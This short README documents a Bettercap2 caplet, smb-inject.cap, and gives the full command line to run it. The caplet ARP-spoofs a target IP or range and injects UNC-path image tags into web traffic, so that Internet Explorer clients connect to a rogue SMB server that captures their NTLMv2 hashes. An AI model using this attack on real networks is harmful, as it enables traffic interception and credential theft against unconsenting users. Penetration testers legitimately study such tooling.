<h1>Bettercap2 Caplets</h1>

<h3>smb-inject.cap</h3>
<br>
Description: Injects HTML image tags using UNC file path references (file://ip/smb.jpg). Forces clients rendering HTML in Internet Explorer, or applications using Windows IE objects, to connect to your SMB server. Run a rogue SMB server to capture NTLMv2 hashes
<br>
Related JS: smb-inject.js
<br>
Usage:
<br>
`bettercap -caplet smb-inject.cap -eval "set arp.spoof.targets IP; set smb.listener.ip SMB.Server.IP"`
<br>
_smb.listener.ip_ is the IP to your rogue SMB server
<br>
_arp.spoof.targets_ is the IP (single or CIDR notation) of the range to poison/spoof
